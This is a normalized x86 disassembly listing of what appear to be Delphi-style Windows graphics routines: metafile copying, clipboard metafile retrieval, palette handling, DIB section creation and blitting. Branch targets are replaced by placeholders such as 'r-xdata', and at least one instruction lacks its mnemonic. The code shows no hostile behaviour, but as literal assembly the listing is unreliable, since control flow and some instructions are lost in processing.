mov [ esi + 0x10 ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
mov [ esi + 0xc ] eax
mov eax [ ebx + 0x28 ]
movzx eax [ eax + 0x18 ]
mov [ esi + 0x18 ] ax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x1c ]
mov [ esi + 0x1c ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x20 ]
mov [ esi + 0x20 ] eax
mov eax [ ebx + 0x28 ]
call sub_428938
mov eax esi
mov [ ebx + 0x28 ] eax
call sub_428934
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
sub_4281c4
push ebx
push esi
push edi
push ecx
mov ebx edx
mov esi eax
cmp [ esi + 0x28 ] 0x0
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax ebx
call sub_41b714
sub eax 0x4
mov [ esp ] eax
cmp [ esi + 0x2c ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_4282d0
mov edx ebx
mov eax esi
call sub_428244
jmp r-xdata
xor ecx ecx
mov edx [ esp ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub eax [ esp ]
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_428244
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_402f00
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4282c0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_41b978
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_402f1c
retn
sub_4282d0
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x22 ]
xor ecx ecx
mov edx 0x16
call sub_403af4
mov ebx [ ebx + 0x28 ]
mov [ ebp - 0x22 ] 0x9ac6cdd7
movzx eax [ ebx + 0x18 ]
test ax ax
jne r-xdata
mov [ ebp - 0x14 ] ax
mov [ ebp - 0x14 ] 0x60
jmp r-xdata
lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax esi
call sub_41b978
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_41b978
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4283f2
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_402f1c
retn
call sub_425a70
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
mov [ ebp - 0x18 ] ax
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
mov [ ebp - 0x16 ] ax
lea eax [ ebp - 0x22 ]
call sub_426870
mov [ ebp - 0xe ] ax
push 0x0
call GetDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_42840b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
push 0x0
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_402f00
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4283eb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
cmp eax [ ebp - 0x8 ]
jae r-xdata
sub_428418
push ebp
mov ebp esp
add esp 0xffffff9c
push ebx
push esi
push edi
mov ebx eax
push 0xe
call GetClipboardData
mov edi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_427bb4
mov esi [ ebx + 0x28 ]
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
lea eax [ ebp - 0x64 ]
push eax
push 0x64
mov eax [ esi + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ esi + 0xc ] eax
mov eax [ ebp - 0x40 ]
sub eax [ ebp - 0x48 ]
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x0
mov [ ebx + 0x2c ] 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ rw-data ]
call sub_4259e0
sub_42849c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov esi [ ebx + 0x28 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov [ edx ] 0xe
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
push 0x0
mov eax [ esi + 0x8 ]
push eax
call CopyEnhMetaFileA
mov [ edi ] eax
sub_4284d0
push ebx
push esi
push edi
add esp 0xffffff9c
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x28 ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax ebx
call sub_427bb4
mov eax [ rw-data ]
push eax
push 0x9ec
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_42802c
mov eax [ rw-data ]
push eax
push 0x9ec
push edi
call MulDiv
mov edx eax
mov eax ebx
call sub_427ff0
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
push esp
push 0x64
push edx
call GetEnhMetaFileHeader
mov eax [ esp + 0x48 ]
push eax
imul eax [ esp + 0x54 ] 0x64
push eax
push esi
call MulDiv
mov edx eax
mov eax ebx
call sub_42802c
mov eax [ esp + 0x4c ]
push eax
imul eax [ esp + 0x58 ] 0x64
push eax
push edi
call MulDiv
mov edx eax
mov eax ebx
call sub_427ff0
jmp r-xdata
mov [ eax + 0x1c ] esi
mov [ eax + 0x20 ] edi
jmp r-xdata
add esp 0x64
pop edi
pop esi
pop ebx
retn
sub_428618
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_419c08
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4286b6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4286bd
mov eax [ rw-data ]
call sub_419c6c
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_42868e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_4287a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_425608
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_419898
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_4255ac
test al al
je r-xdata
sub_4286c4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_419c08
mov esi eax
xor ecx ecx
push ebp
push sub_428734
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_419c6c
retn
mov edx ebx
mov eax esi
call sub_419898
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ edx + 0x28 ]
mov edx [ edx + 0x8 ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
call sub_4287a8
sub_428740
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_425108
mov [ edi + 0x58 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_42877c
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
mov eax esi
call sub_4287a8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4251cc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_4287a8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4253d0
xor edx edx
push ebp
push sub_42883c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
test eax eax
je r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_42579c
push ebx
call DeleteDC
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_419c1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_425608
retn
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
sub_428848
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4253d0
xor eax eax
push ebp
push sub_428927
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_429c5c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x8 ]
call sub_4286c4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_429d5c
push 0x0
call CreateCompatibleDC
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x5c ] edx
push esi
push ebx
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x60 ] edx
push 0xffffffff
push esi
push ebx
call SelectPalette
mov edx [ ebp - 0x4 ]
mov [ edx + 0x60 ] eax
push ebx
call RealizePalette
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x10 ]
test esi esi
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_42579c
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_419b80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_425608
retn
sub_428938
push ebx
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax ebx
call sub_404650
sub_428958
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
call sub_4286c4
mov eax [ esi + 0x14 ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x6c ]
call sub_40f944
mov edx ebx
and dl 0xfc
mov eax esi
call sub_404640
test bl bl
jle r-xdata
push eax
call CloseHandle
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_4289b4
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
call sub_4286c4
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
call sub_4238c0
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
call sub_4286c4
mov eax [ ebx + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ ebx + 0xc ] eax
push eax
call DeleteObject
sub_428a00
push ebp
mov ebp esp
add esp 0xfffffbf0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ecx + 0x26 ] 0x8
ja r-xdata
lea edx [ ebp - 0x410 ]
mov ecx 0xff
mov eax [ ebp - 0x4 ]
call sub_4262b4
mov ebx eax
test ebx ebx
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_428aaf
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x410 ]
push eax
push ebx
push 0x0
mov eax [ ebp - 0xc ]
push eax
call SetDIBColorTable
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_428abc
test [ eax + 0x28 ] 0x3
je r-xdata
retn
cmp [ eax + 0x40 ] 0x0
jne r-xdata
movzx edx [ eax + 0x26 ]
cmp dx 0x10
jne r-xdata
cmp dx 0x20
jne r-xdata
mov [ eax + 0x40 ] 0xf800
mov [ eax + 0x44 ] 0x7e0
mov [ eax + 0x48 ] 0x1f
jmp r-xdata
mov [ eax + 0x40 ] 0xff0000
mov [ eax + 0x44 ] 0xff00
mov [ eax + 0x48 ] 0xff
sub_428b08
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4286c4
xor eax eax
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_425b18
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_425b18
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_429156
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x28
jae r-xdata
lea eax [ ebp - 0x88 ]
push eax
push 0x54
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
cmp eax 0x18
jge r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax 0x42c
call sub_402f00
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_428e60
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
mov [ eax + 0x18 ] 0x28
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
movzx eax [ eax + 0x10 ]
mov edx [ ebp + 0xc ]
or ax [ edx + 0x12 ]
cmp ax 0x1
jne r-xdata
call sub_4259f8
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x24 ]
lea esi [ eax + 0x18 ]
mov edi edx
mov ecx 0xa
[ edi ] [ esi ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
ja r-xdata
push 0xc
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xe
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax [ ebp + 0xc ]
mov [ eax + 0x26 ] bx
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleBitmap
call sub_425b18
mov [ ebp - 0x10 ] eax
jmp r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
call CreateBitmap
call sub_425b18
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
movzx eax [ eax + 0x26 ]
cmp ax 0x10
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_425b18
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
call sub_425b18
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_429107
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4290f6
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x34 ] eax
xor ebx ebx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test [ eax + 0x28 ] 0x3
je r-xdata
mov edx [ ebp + 0xc ]
cmp ax 0x20
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_4290d4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x1c ]
push eax
call RealizePalette
push 0x0
push 0x0
lea eax [ ebp - 0x28 ]
push eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateDIBSection
call sub_425b18
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
call sub_428abc
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp + 0xc ]
add eax 0x40
mov ecx 0xc
call sub_4030fc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov ecx 0xff
mov eax [ ebp - 0xc ]
call sub_4262b4
jmp r-xdata
mov eax [ ebp - 0x24 ]
xor edx edx
mov [ eax + 0x28 ] edx
mov eax [ ebp - 0x24 ]
add eax 0x28
add eax 0x4
mov [ eax ] 0xffffff
jmp r-xdata
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
push 0xff0062
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call PatBlt
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_424fec
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x98 ]
push eax
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
xor edx edx
xor eax eax
call sub_418448
lea eax [ ebp - 0x98 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call FillRect
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_424230
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_424fb0
call sub_424230
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_425a70
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x70 ] 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4290db
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_425b18
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push j_sub_404de4#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_425b18
mov esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x24 ]
call sub_402f1c
retn
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
cmp eax [ ebp - 0x84 ]
jne r-xdata
push 0x0
mov eax [ ebp - 0x24 ]
push eax
push 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
cmp [ ebp - 0x74 ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
mov ebx eax
mov eax [ ebp - 0x20 ]
push eax
call RealizePalette
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_424230
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_424fb0
call sub_424230
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
push 0x2
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call SetDIBColorTable
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cmp eax [ ebp - 0x80 ]
jne r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x28
push eax
push 0x100
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call GetDIBColorTable
mov edx [ ebp + 0xc ]
mov [ edx + 0x38 ] eax
jmp r-xdata
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call BitBlt
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_424230
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_424fb0
call sub_424230
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
jbe r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
jmp r-xdata
push esi
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_425b18
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
push eax
call DeleteDC
retn
push 0xffffffff
push ebx
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
call sub_404f70
call sub_404f70
jmp r-xdata
sub_4290fd
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_42910c
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
call sub_404eec
call sub_404f40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_42916c
push ebx
push esi
add esp 0xfffffbf8
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
add esp 0x408
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov [ esp + 0x4 ] 0x300
movzx eax [ esp ]
mov [ esp + 0x6 ] ax
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
lea eax [ esp + 0x4 ]
push eax
call CreatePalette
mov esi eax
sub_4291d0
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x70 ]
push eax
push 0x54
push ebx
call GetObjectA
test eax eax
je r-xdata
mov eax ebx
call sub_4286c4
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4293cb
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call GetDC
call sub_425b18
